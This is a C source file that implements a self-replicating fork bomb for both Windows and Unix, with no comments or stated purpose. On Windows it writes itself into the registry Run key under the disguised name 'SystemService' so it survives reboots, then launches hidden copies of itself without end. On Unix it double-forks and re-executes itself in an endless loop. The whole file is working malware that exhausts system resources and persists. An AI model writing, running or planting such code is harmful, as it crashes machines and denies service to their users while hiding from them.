#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
    #include <windows.h>
    #include <process.h>
#else
    #include <unistd.h>
    #include <sys/wait.h>
#endif

#ifdef _WIN32
void add_to_startup() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (const BYTE*)path, strlen(path)+1);
    RegCloseKey(hKey);
}

void windows_process() {
    add_to_startup();
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    while (1) {
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        
        CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        for (int i = 0; i < 5; i++) {
            CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        Sleep(100);
    }
}
#else
void unix_process() {
    while (1) {
        for (int i = 0; i < 3; i++) {
            if (fork() == 0) {
                if (fork() == 0) {
                    execl("/proc/self/exe", "/proc/self/exe", NULL);
                    _exit(0);
                }
                _exit(0);
            }
        }
        sleep(1);
    }
}
#endif

int main() {
#ifdef _WIN32
    windows_process();
#else
    unix_process();
#endif
    return 0;
}